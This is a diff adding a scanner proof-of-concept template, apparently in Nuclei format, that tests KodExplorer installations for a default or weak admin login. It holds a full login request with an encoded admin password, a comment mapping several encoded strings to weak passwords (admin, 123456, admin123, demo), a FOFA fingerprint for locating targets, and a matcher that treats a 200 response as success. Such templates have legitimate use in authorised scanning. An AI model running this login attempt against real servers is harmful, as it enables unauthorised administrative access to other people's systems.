@@ -1,0 +1,44 @@
+id: poc-lzfefl3dvi3rcpct
+info:
+  name: KodExplorer index.php存在弱口令漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lzfefl3dvi3rcpct'
+  tags: default-login,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lzfefl3dvi3rcpct
+    fofa: fid="XuUvDMYOVL9Q/ULYCpDj+Q=="
+http:
+- raw:
+  - 'GET /index.php?user/loginSubmit&name=admin&salt=1&checkCode=undefined&password=hl7dg43c2zTBLAGqrvTW2e3_bNsndvw6NV33I2RxBHotRQt_bQw&rememberPassword=0&isAjax=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    X-Requested-With: XMLHttpRequest
+
+    Connection: close
+
+
+    弱口令对应解码值
+
+    #hl7dg43c2zTBLAGqrvTW2e3_bNsndvw6NV33I2RxBHotRQt_bQw  admin
+
+    #nky4Xde4fG1tKESNFe7gv9Zx4aEo7XW39edizMky1nv2JtdyMjn8  123456
+
+    #n4OUb94feaGDUeqhP3QebjbwTSiwMhno34ZFWyz2OAnhWiz7rRbZ-oQ  admin123
+
+    #qG9Xs6afd3Sd7p24zOsoUMVbZd_bQg4726FUUfkthO_dXZIb7  demo'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
